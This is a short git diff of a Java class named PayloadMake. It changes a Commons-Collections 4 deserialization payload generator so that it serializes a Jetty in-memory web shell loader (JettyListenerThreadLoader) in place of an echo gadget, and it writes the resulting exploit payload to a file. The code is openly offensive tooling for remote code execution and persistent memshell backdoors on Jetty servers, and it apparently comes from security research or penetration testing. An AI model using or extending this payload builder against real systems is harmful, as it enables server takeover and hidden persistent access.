@@ -4,6 +4,8 @@ import me.gv7.tools.josearcher.entity.Blacklist;
 import me.gv7.tools.josearcher.entity.Keyword;
 import me.gv7.tools.josearcher.searcher.SearchRequstByBFS;
 import org.example.jetty.gadget.JettyEcho;
+import org.example.jetty.memshell.JettyListenerThreadLoader;
+import org.example.jetty.memshell.Test;
 import org.ppp.tools.encryption.B64;
 import org.ppp.tools.ser.CC4Generator;
 
@@ -19,11 +21,11 @@ public class PayloadMake {
     }
 
     public static void cc4() throws Exception {
-        Class msmClass = JettyEcho.class;
+        Class msmClass = JettyListenerThreadLoader.class;
         CC4Generator cc4Generator = new CC4Generator();
         String payload = cc4Generator.make(msmClass);
         System.out.println(payload.length());
-        cc4Generator.makeFile(msmClass, "dev/JettyEcho.bin");
+        cc4Generator.makeFile(msmClass, "dev/test.bin");
     }
 
     public void searchJetty() {
